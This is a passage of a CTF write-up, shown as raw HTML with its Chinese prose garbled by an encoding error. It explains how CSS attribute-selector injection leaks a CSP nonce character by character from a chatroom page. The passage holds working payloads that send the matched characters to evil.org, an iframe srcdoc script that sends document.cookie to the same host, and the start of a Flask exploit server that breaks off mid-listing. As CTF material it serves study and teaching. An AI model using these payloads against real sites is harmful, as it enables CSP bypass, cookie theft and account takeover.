title="æˆ‘ä»¬çš„ç¬¬ä¸€ç§æ–¹æ³•æ˜¯scriptç›´æ¥åŒ¹é…æ ‡è®°ï¼šscript[nonce^=&quot;a&quot;]ã€‚"></a>æˆ‘ä»¬çš„ç¬¬ä¸€ç§æ–¹æ³•æ˜¯<code>script</code>ç›´æ¥åŒ¹é…æ ‡è®°ï¼š<code>script[nonce^=&quot;a&quot;]</code>ã€‚</h6><h6 id="è¿™åº”å°†ä»»ä½•scriptæ ‡è®°ä¸ä»¥å¼€å¤´çš„nonceåŒ¹é…aã€‚"><a href="#è¿™åº”å°†ä»»ä½•scriptæ ‡è®°ä¸ä»¥å¼€å¤´çš„nonceåŒ¹é…aã€‚" class="headerlink" title="è¿™åº”å°†ä»»ä½•scriptæ ‡è®°ä¸ä»¥å¼€å¤´çš„nonceåŒ¹é…aã€‚"></a>è¿™åº”å°†ä»»ä½•<code>script</code>æ ‡è®°ä¸ä»¥å¼€å¤´çš„<code>nonce</code>åŒ¹é…<code>a</code>ã€‚</h6><h6 id="ä½†æ˜¯ï¼Œè¿™æ²¡æœ‰æŒ‰é¢„æœŸå·¥ä½œã€‚ç»è¿‡å¤§é‡çš„å®éªŒå’Œé”™è¯¯ï¼Œæˆ‘ä»¬å‘ç°ä½ ä¸èƒ½ç›´æ¥åŒ¹é…scriptæ ‡ç­¾ï¼Œä½†æ˜¯åœ¨é€‰æ‹©å…¶ä»–å…ƒç´ æ—¶å¯ä»¥å°†å…¶ç”¨ä½œé€‰æ‹©å™¨çš„ä¸€éƒ¨åˆ†ã€‚å› æ­¤æˆ‘ä»¬å†³å®šä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„å…„å¼Ÿé€‰æ‹©å™¨ï¼šscript-nonce-quot-s-quot-navã€‚"><a href="#ä½†æ˜¯ï¼Œè¿™æ²¡æœ‰æŒ‰é¢„æœŸå·¥ä½œã€‚ç»è¿‡å¤§é‡çš„å®éªŒå’Œé”™è¯¯ï¼Œæˆ‘ä»¬å‘ç°ä½ ä¸èƒ½ç›´æ¥åŒ¹é…scriptæ ‡ç­¾ï¼Œä½†æ˜¯åœ¨é€‰æ‹©å…¶ä»–å…ƒç´ æ—¶å¯ä»¥å°†å…¶ç”¨ä½œé€‰æ‹©å™¨çš„ä¸€éƒ¨åˆ†ã€‚å› æ­¤æˆ‘ä»¬å†³å®šä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„å…„å¼Ÿé€‰æ‹©å™¨ï¼šscript-nonce-quot-s-quot-navã€‚" class="headerlink" title="ä½†æ˜¯ï¼Œè¿™æ²¡æœ‰æŒ‰é¢„æœŸå·¥ä½œã€‚ç»è¿‡å¤§é‡çš„å®éªŒå’Œé”™è¯¯ï¼Œæˆ‘ä»¬å‘ç°ä½ ä¸èƒ½ç›´æ¥åŒ¹é…scriptæ ‡ç­¾ï¼Œä½†æ˜¯åœ¨é€‰æ‹©å…¶ä»–å…ƒç´ æ—¶å¯ä»¥å°†å…¶ç”¨ä½œé€‰æ‹©å™¨çš„ä¸€éƒ¨åˆ†ã€‚å› æ­¤æˆ‘ä»¬å†³å®šä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„å…„å¼Ÿé€‰æ‹©å™¨ï¼šscript[nonce^=&quot;%s&quot;] ~ navã€‚"></a>ä½†æ˜¯ï¼Œè¿™æ²¡æœ‰æŒ‰é¢„æœŸå·¥ä½œã€‚ç»è¿‡å¤§é‡çš„å®éªŒå’Œé”™è¯¯ï¼Œæˆ‘ä»¬å‘ç°ä½ ä¸èƒ½ç›´æ¥åŒ¹é…<code>script</code>æ ‡ç­¾ï¼Œä½†æ˜¯åœ¨é€‰æ‹©å…¶ä»–å…ƒç´ æ—¶å¯ä»¥å°†å…¶ç”¨ä½œé€‰æ‹©å™¨çš„ä¸€éƒ¨åˆ†ã€‚å› æ­¤æˆ‘ä»¬å†³å®šä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„å…„å¼Ÿé€‰æ‹©å™¨ï¼š<code>script[nonce^=&quot;%s&quot;] ~ nav</code>ã€‚</h6><h6 id="å› ä¸ºnavå’Œscriptæ˜¯å…„å¼Ÿæ ‡ç­¾ï¼Œæ‰€ä»¥æ•ˆæœå¾ˆå¥½ã€‚"><a href="#å› ä¸ºnavå’Œscriptæ˜¯å…„å¼Ÿæ ‡ç­¾ï¼Œæ‰€ä»¥æ•ˆæœå¾ˆå¥½ã€‚" class="headerlink" title="å› ä¸ºnavå’Œscriptæ˜¯å…„å¼Ÿæ ‡ç­¾ï¼Œæ‰€ä»¥æ•ˆæœå¾ˆå¥½ã€‚"></a>å› ä¸º<code>nav</code>å’Œ<code>script</code>æ˜¯å…„å¼Ÿæ ‡ç­¾ï¼Œæ‰€ä»¥æ•ˆæœå¾ˆå¥½ã€‚</h6><h5 id="ä½¿ç”¨ä»¥ä¸Šçš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€å¦‚ä¸‹çš„æ¶ˆæ¯ï¼š"><a href="#ä½¿ç”¨ä»¥ä¸Šçš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€å¦‚ä¸‹çš„æ¶ˆæ¯ï¼š" class="headerlink" title="ä½¿ç”¨ä»¥ä¸Šçš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€å¦‚ä¸‹çš„æ¶ˆæ¯ï¼š"></a>ä½¿ç”¨ä»¥ä¸Šçš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€å¦‚ä¸‹çš„æ¶ˆæ¯ï¼š</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">script[nonce^=&quot;0&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=0&quot;)&#125;</span><br><span class="line">script[nonce^=&quot;1&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=1&quot;)&#125;</span><br><span class="line">...</span><br><span class="line">script[nonce^=&quot;f&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=f&quot;)&#125;</span><br></pre></td></tr></table></figure>

<h6 id="ä»…å½“è‡³å°‘ä¸€ä¸ªå…ƒç´ ä¸é€‰æ‹©å™¨åŒ¹é…æ—¶æ‰è§¦å‘-å› æ­¤ï¼Œä»…æ‰§è¡Œ-quot-æ­£ç¡®-quot-è¯·æ±‚-ã€‚å‡è®¾ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯aï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªpayloadå¦‚ä¸‹ï¼š"><a href="#ä»…å½“è‡³å°‘ä¸€ä¸ªå…ƒç´ ä¸é€‰æ‹©å™¨åŒ¹é…æ—¶æ‰è§¦å‘-å› æ­¤ï¼Œä»…æ‰§è¡Œ-quot-æ­£ç¡®-quot-è¯·æ±‚-ã€‚å‡è®¾ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯aï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªpayloadå¦‚ä¸‹ï¼š" class="headerlink" title="ä»…å½“è‡³å°‘ä¸€ä¸ªå…ƒç´ ä¸é€‰æ‹©å™¨åŒ¹é…æ—¶æ‰è§¦å‘(å› æ­¤ï¼Œä»…æ‰§è¡Œ&quot;æ­£ç¡®&quot;è¯·æ±‚)ã€‚å‡è®¾ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯aï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªpayloadå¦‚ä¸‹ï¼š"></a>ä»…å½“è‡³å°‘ä¸€ä¸ªå…ƒç´ ä¸é€‰æ‹©å™¨åŒ¹é…æ—¶æ‰è§¦å‘(å› æ­¤ï¼Œä»…æ‰§è¡Œ&quot;æ­£ç¡®&quot;è¯·æ±‚)ã€‚å‡è®¾ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯<code>a</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ä¸‹ä¸€ä¸ªpayloadå¦‚ä¸‹ï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">script[nonce^=&quot;a0&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=a0&quot;)&#125;</span><br><span class="line">script[nonce^=&quot;a1&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=a1&quot;)&#125;</span><br><span class="line">...</span><br><span class="line">script[nonce^=&quot;af&quot;] ~ nav &#123;background:url(&quot;http://evil.org/?match=af&quot;)&#125;</span><br></pre></td></tr></table></figure>

<h6 id="æˆ‘ä»¬å¯ä»¥é‡å¤æ­¤è¿‡ç¨‹24æ¬¡ï¼Œä»¥çˆ†ç ´å‡ºè¿™ä¸ªnonceã€‚"><a href="#æˆ‘ä»¬å¯ä»¥é‡å¤æ­¤è¿‡ç¨‹24æ¬¡ï¼Œä»¥çˆ†ç ´å‡ºè¿™ä¸ªnonceã€‚" class="headerlink" title="æˆ‘ä»¬å¯ä»¥é‡å¤æ­¤è¿‡ç¨‹24æ¬¡ï¼Œä»¥çˆ†ç ´å‡ºè¿™ä¸ªnonceã€‚"></a>æˆ‘ä»¬å¯ä»¥é‡å¤æ­¤è¿‡ç¨‹24æ¬¡ï¼Œä»¥çˆ†ç ´å‡ºè¿™ä¸ª<code>nonce</code>ã€‚</h6><h6 id="æˆ‘ä»¬ä½¿ç”¨pythonå®ç°äº†ä¸€ä¸ªæ”»å‡»æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨æ¥æ”¶æˆåŠŸçš„è¯·æ±‚ï¼Œå¹¶å¦‚ä¸Šæ‰€è¿°å‘èŠå¤©å®¤å‘é€å¦å¤–ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¯¢é—®ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚é€šè¿‡è¿æ¥åˆ°èŠå¤©å®¤çš„websocketï¼Œå°†ä¸‹ä¸€ä¸ªæœ‰æ•ˆçš„payloadç›´æ¥å‘é€åˆ°èŠå¤©å®¤ã€‚"><a href="#æˆ‘ä»¬ä½¿ç”¨pythonå®ç°äº†ä¸€ä¸ªæ”»å‡»æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨æ¥æ”¶æˆåŠŸçš„è¯·æ±‚ï¼Œå¹¶å¦‚ä¸Šæ‰€è¿°å‘èŠå¤©å®¤å‘é€å¦å¤–ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¯¢é—®ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚é€šè¿‡è¿æ¥åˆ°èŠå¤©å®¤çš„websocketï¼Œå°†ä¸‹ä¸€ä¸ªæœ‰æ•ˆçš„payloadç›´æ¥å‘é€åˆ°èŠå¤©å®¤ã€‚" class="headerlink" title="æˆ‘ä»¬ä½¿ç”¨pythonå®ç°äº†ä¸€ä¸ªæ”»å‡»æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨æ¥æ”¶æˆåŠŸçš„è¯·æ±‚ï¼Œå¹¶å¦‚ä¸Šæ‰€è¿°å‘èŠå¤©å®¤å‘é€å¦å¤–ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¯¢é—®ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚é€šè¿‡è¿æ¥åˆ°èŠå¤©å®¤çš„websocketï¼Œå°†ä¸‹ä¸€ä¸ªæœ‰æ•ˆçš„payloadç›´æ¥å‘é€åˆ°èŠå¤©å®¤ã€‚"></a>æˆ‘ä»¬ä½¿ç”¨pythonå®ç°äº†ä¸€ä¸ªæ”»å‡»æœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨æ¥æ”¶æˆåŠŸçš„è¯·æ±‚ï¼Œå¹¶å¦‚ä¸Šæ‰€è¿°å‘èŠå¤©å®¤å‘é€å¦å¤–ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¯¢é—®ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚é€šè¿‡è¿æ¥åˆ°èŠå¤©å®¤çš„websocketï¼Œå°†ä¸‹ä¸€ä¸ªæœ‰æ•ˆçš„payloadç›´æ¥å‘é€åˆ°èŠå¤©å®¤ã€‚</h6><h6 id="ä½†æ˜¯ï¼Œåœ¨å°è¯•åï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä»…ä»…å‘é€äº†ç¬¬ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ˜¯å› ä¸ºåç»­çš„CSSæ³¨å…¥ä¸ä»¥å‰çš„CSSè§„åˆ™å…·æœ‰ç›¸åŒçš„ç‰¹å¼‚æ€§ã€‚è¿™æ„å‘³ç€åŒ…å«å†æ¬¡æ‰§è¡Œåå°è·å–ã€‚æˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨è®¾ç½®ä¸€ç»„ä»æœ€å°åˆ°æœ€é‡è¦çš„24ä¸ªé€‰æ‹©å™¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚"><a href="#ä½†æ˜¯ï¼Œåœ¨å°è¯•åï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä»…ä»…å‘é€äº†ç¬¬ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ˜¯å› ä¸ºåç»­çš„CSSæ³¨å…¥ä¸ä»¥å‰çš„CSSè§„åˆ™å…·æœ‰ç›¸åŒçš„ç‰¹å¼‚æ€§ã€‚è¿™æ„å‘³ç€åŒ…å«å†æ¬¡æ‰§è¡Œåå°è·å–ã€‚æˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨è®¾ç½®ä¸€ç»„ä»æœ€å°åˆ°æœ€é‡è¦çš„24ä¸ªé€‰æ‹©å™¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚" class="headerlink" title="ä½†æ˜¯ï¼Œåœ¨å°è¯•åï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä»…ä»…å‘é€äº†ç¬¬ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ˜¯å› ä¸ºåç»­çš„CSSæ³¨å…¥ä¸ä»¥å‰çš„CSSè§„åˆ™å…·æœ‰ç›¸åŒçš„ç‰¹å¼‚æ€§ã€‚è¿™æ„å‘³ç€åŒ…å«å†æ¬¡æ‰§è¡Œåå°è·å–ã€‚æˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨è®¾ç½®ä¸€ç»„ä»æœ€å°åˆ°æœ€é‡è¦çš„24ä¸ªé€‰æ‹©å™¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚"></a>ä½†æ˜¯ï¼Œåœ¨å°è¯•åï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ä»…ä»…å‘é€äº†ç¬¬ä¸€ä¸ªè¯·æ±‚ã€‚è¿™æ˜¯å› ä¸ºåç»­çš„CSSæ³¨å…¥ä¸ä»¥å‰çš„CSSè§„åˆ™å…·æœ‰ç›¸åŒçš„ç‰¹å¼‚æ€§ã€‚è¿™æ„å‘³ç€åŒ…å«å†æ¬¡æ‰§è¡Œåå°è·å–ã€‚æˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨è®¾ç½®ä¸€ç»„ä»æœ€å°åˆ°æœ€é‡è¦çš„24ä¸ªé€‰æ‹©å™¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">script[nonce^=&quot;%s&quot;] ~ *</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ ul</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ div</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ input</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ nav</span><br><span class="line">body &gt; script[nonce^=&quot;%s&quot;] ~ ul</span><br><span class="line">body &gt; script[nonce^=&quot;%s&quot;] ~ div</span><br><span class="line">body &gt; script[nonce^=&quot;%s&quot;] ~ input</span><br><span class="line">body &gt; script[nonce^=&quot;%s&quot;] ~ nav</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ #messages</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ #status</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ #chatbox</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ #recaptcha</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ nav &gt; a</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ nav &gt; #report-link</span><br><span class="line">script[nonce^=&quot;%s&quot;] ~ nav &gt; #username</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ #messages</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ #status</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ #chatbox</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ #recaptcha</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; a</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; #report-link</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; #username</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; [href=&quot;/&quot;]</span><br><span class="line">body script[nonce^=&quot;%s&quot;] ~ nav &gt; [href=&quot;#&quot;]</span><br></pre></td></tr></table></figure>

<h6 id="ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬è®¾æ³•è·å¾—äº†å®Œæ•´çš„nonceï¼"><a href="#ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬è®¾æ³•è·å¾—äº†å®Œæ•´çš„nonceï¼" class="headerlink" title="ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬è®¾æ³•è·å¾—äº†å®Œæ•´çš„nonceï¼"></a>ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬è®¾æ³•è·å¾—äº†å®Œæ•´çš„<code>nonce</code>ï¼</h6><h4 id="åˆ›å»ºæ¼æ´"><a href="#åˆ›å»ºæ¼æ´" class="headerlink" title="åˆ›å»ºæ¼æ´"></a>åˆ›å»ºæ¼æ´</h4><h6 id="ç°åœ¨æˆ‘ä»¬æœ‰äº†nonceï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å…¥script-tagsç»•è¿‡CSPå¹¶æ‰§è¡Œå®ƒã€‚ä½†æ˜¯ï¼Œç›´æ¥åŠ è½½-lt-script-nonce-quot-quot-gt-alert-1-lt-script-gt-ä¸ä¼šäº§ç”Ÿä»»ä½•æ•ˆæœï¼Œå› ä¸ºåœ¨é¡µé¢åŠ è½½åä¸ä¼šè¯„ä¼°-evaluated-è„šæœ¬ã€‚å› æ­¤ï¼Œè¦ç»•è¿‡æ­¤é™åˆ¶ï¼Œæˆ‘ä»¬iframeé€šè¿‡å°†è„šæœ¬æŒ‡å®šä¸ºæ¥å°†è„šæœ¬åŒ…å«åœ¨ä¸­srcdocã€‚æˆ‘ä»¬æœ€ç»ˆçš„æ¼æ´åˆ©ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š"><a href="#ç°åœ¨æˆ‘ä»¬æœ‰äº†nonceï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å…¥script-tagsç»•è¿‡CSPå¹¶æ‰§è¡Œå®ƒã€‚ä½†æ˜¯ï¼Œç›´æ¥åŠ è½½-lt-script-nonce-quot-quot-gt-alert-1-lt-script-gt-ä¸ä¼šäº§ç”Ÿä»»ä½•æ•ˆæœï¼Œå› ä¸ºåœ¨é¡µé¢åŠ è½½åä¸ä¼šè¯„ä¼°-evaluated-è„šæœ¬ã€‚å› æ­¤ï¼Œè¦ç»•è¿‡æ­¤é™åˆ¶ï¼Œæˆ‘ä»¬iframeé€šè¿‡å°†è„šæœ¬æŒ‡å®šä¸ºæ¥å°†è„šæœ¬åŒ…å«åœ¨ä¸­srcdocã€‚æˆ‘ä»¬æœ€ç»ˆçš„æ¼æ´åˆ©ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š" class="headerlink" title="ç°åœ¨æˆ‘ä»¬æœ‰äº†nonceï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å…¥script-tagsç»•è¿‡CSPå¹¶æ‰§è¡Œå®ƒã€‚ä½†æ˜¯ï¼Œç›´æ¥åŠ è½½&lt;script nonce=&quot;...&quot;&gt;alert(1);&lt;/script&gt;ä¸ä¼šäº§ç”Ÿä»»ä½•æ•ˆæœï¼Œå› ä¸ºåœ¨é¡µé¢åŠ è½½åä¸ä¼šè¯„ä¼°(evaluated)è„šæœ¬ã€‚å› æ­¤ï¼Œè¦ç»•è¿‡æ­¤é™åˆ¶ï¼Œæˆ‘ä»¬iframeé€šè¿‡å°†è„šæœ¬æŒ‡å®šä¸ºæ¥å°†è„šæœ¬åŒ…å«åœ¨ä¸­srcdocã€‚æˆ‘ä»¬æœ€ç»ˆçš„æ¼æ´åˆ©ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š"></a>ç°åœ¨æˆ‘ä»¬æœ‰äº†<code>nonce</code>ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨å…¥script-tagsç»•è¿‡CSPå¹¶æ‰§è¡Œå®ƒã€‚ä½†æ˜¯ï¼Œç›´æ¥åŠ è½½<code>&lt;script nonce=&quot;...&quot;&gt;alert(1);&lt;/script&gt;</code>ä¸ä¼šäº§ç”Ÿä»»ä½•æ•ˆæœï¼Œå› ä¸ºåœ¨é¡µé¢åŠ è½½åä¸ä¼šè¯„ä¼°(evaluated)è„šæœ¬ã€‚å› æ­¤ï¼Œè¦ç»•è¿‡æ­¤é™åˆ¶ï¼Œæˆ‘ä»¬<code>iframe</code>é€šè¿‡å°†è„šæœ¬æŒ‡å®šä¸ºæ¥å°†è„šæœ¬åŒ…å«åœ¨ä¸­<code>srcdoc</code>ã€‚æˆ‘ä»¬æœ€ç»ˆçš„æ¼æ´åˆ©ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&lt;script nonce=...&gt;alert(document.cookie); var x = document.createElement(&apos;img&apos;); x.src = &apos;http://evil.org/res?c=&apos; + document.cookie;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<h6 id="æ³¨æ„ï¼Œæˆ‘ä»¬è¯•å›¾åŠ è½½å›¾åƒè€Œä¸æ˜¯ç›´æ¥å‘é€è¯·æ±‚ï¼Œå› ä¸ºåè€…è¢«CSPé˜»æ­¢ã€‚å¹¸è¿çš„æ˜¯ï¼ŒCSPå…è®¸åŠ è½½ä»»ä½•æ¥æºçš„å›¾åƒã€‚"><a href="#æ³¨æ„ï¼Œæˆ‘ä»¬è¯•å›¾åŠ è½½å›¾åƒè€Œä¸æ˜¯ç›´æ¥å‘é€è¯·æ±‚ï¼Œå› ä¸ºåè€…è¢«CSPé˜»æ­¢ã€‚å¹¸è¿çš„æ˜¯ï¼ŒCSPå…è®¸åŠ è½½ä»»ä½•æ¥æºçš„å›¾åƒã€‚" class="headerlink" title="æ³¨æ„ï¼Œæˆ‘ä»¬è¯•å›¾åŠ è½½å›¾åƒè€Œä¸æ˜¯ç›´æ¥å‘é€è¯·æ±‚ï¼Œå› ä¸ºåè€…è¢«CSPé˜»æ­¢ã€‚å¹¸è¿çš„æ˜¯ï¼ŒCSPå…è®¸åŠ è½½ä»»ä½•æ¥æºçš„å›¾åƒã€‚"></a>æ³¨æ„ï¼Œæˆ‘ä»¬è¯•å›¾åŠ è½½å›¾åƒè€Œä¸æ˜¯ç›´æ¥å‘é€è¯·æ±‚ï¼Œå› ä¸ºåè€…è¢«CSPé˜»æ­¢ã€‚å¹¸è¿çš„æ˜¯ï¼ŒCSPå…è®¸åŠ è½½ä»»ä½•æ¥æºçš„å›¾åƒã€‚</h6><h5 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h5><h6 id="Our-final-approach-was-the-following"><a href="#Our-final-approach-was-the-following" class="headerlink" title="Our final approach was the following:"></a>Our final approach was the following:</h6><h6 id="1-Enter-a-chatroom-using-Chrome-so-that-we-are-unaffected-by-the-exploit"><a href="#1-Enter-a-chatroom-using-Chrome-so-that-we-are-unaffected-by-the-exploit" class="headerlink" title="1. Enter a chatroom using Chrome so that we are unaffected by the exploit"></a>1. Enter a chatroom using Chrome so that we are unaffected by the exploit</h6><h6 id="2-Start-the-exploit-server-pointed-at-the-chatroom"><a href="#2-Start-the-exploit-server-pointed-at-the-chatroom" class="headerlink" title="2. Start the exploit server pointed at the chatroom"></a>2. Start the exploit server pointed at the chatroom</h6><h6 id="3-Report-the-chatroom-and-wait-for-the-admin-to-join"><a href="#3-Report-the-chatroom-and-wait-for-the-admin-to-join" class="headerlink" title="3. Report the chatroom and wait for the admin to join"></a>3. Report the chatroom and wait for the admin to join</h6><h6 id="4-Send-the-initial-CSS-payload-manually-through-the-browser"><a href="#4-Send-the-initial-CSS-payload-manually-through-the-browser" class="headerlink" title="4. Send the initial CSS payload manually through the browser."></a>4. Send the initial CSS payload manually through the browser.</h6><h6 id="5-Let-the-server-handle-the-rest"><a href="#5-Let-the-server-handle-the-rest" class="headerlink" title="5. Let the server handle the rest"></a>5. Let the server handle the rest</h6><ul>
<li>1.Wait for an http request from the admin</li>
<li>2.Parse the GET parameter</li>
<li>3.Send the next CSS payload via websockets to exfiltrate the next 4haracter</li>
<li>4.Repeat until we have the whole nonce</li>
<li>5.Send the exploit iframe</li>
<li>6.Listen for the request from the admin containing the cookies containing the flag</li>
<li>7.????</li>
<li>8.PROFIT!!!!</li>
</ul>
<h6 id="Below-is-the-final-script-that-ran-on-the-server"><a href="#Below-is-the-final-script-that-ran-on-the-server" class="headerlink" title="Below is the final script that ran on the server:"></a>Below is the final script that ran on the server:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">URL = <span class="string">"http://evil.org:5000"</span></span><br><span class="line"></span><br><span class="line">payloads = [</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ *'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ ul'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ div'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ input'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ nav'</span>,</span><br><span class="line">        <span class="string">'body &gt; script[nonce^="%s"] ~ ul'</span>,</span><br><span class="line">        <span class="string">'body &gt; script[nonce^="%s"] ~ div'</span>,</span><br><span class="line">        <span class="string">'body &gt; script[nonce^="%s"] ~ input'</span>,</span><br><span class="line">        <span class="string">'body &gt; script[nonce^="%s"] ~ nav'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ #messages'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ #status'</span>,</span><br><span class="line">        <span 